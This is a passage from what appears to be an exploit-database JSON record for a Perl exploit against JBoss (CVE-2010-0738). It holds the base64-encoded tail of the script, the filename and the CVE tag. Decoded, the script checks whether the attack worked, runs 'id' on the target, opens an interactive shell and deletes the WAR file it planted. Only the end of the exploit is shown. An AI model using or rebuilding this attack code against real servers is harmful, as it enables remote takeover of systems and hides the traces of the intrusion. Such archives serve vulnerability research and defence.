MCApew0KICAgIHByaW50ICIgWypdICMjIEV4cGxvaXQgY2VydGFpbmx5IGZhaWxlZCEgIyNcbiI7DQogICAgcHJpbnQgIiBbKl0gWW91IGNhbiB3YWl0IGEgbGl0dGxlIGxvbmdlciAocnVuID4gY2hlY2tfY21kKVxuIjsNCn1lbHNlew0KICAgIHByaW50ICIgWypdIENvbmdyYXRzLCBpcyB1cCFcbiI7DQogICAgZXhlY3V0ZSgiaWQiKTsNCn0NCg0Kc2hlbGwoKTsNCg0KcHJpbnQgIiBbKl0gQ2xlYW4gb2YgJHVybCBpbiBwcm9ncmVzcy4uLlxuIjsNCmNsZWFuX3dhcigpOw0KDQpleGl0KDApOw==", 
    "filename": "platforms/jsp/webapps/17924.pl", 
    "id": "17924", 
    "cves": [
        "CVE-2010-0738"
    ]
}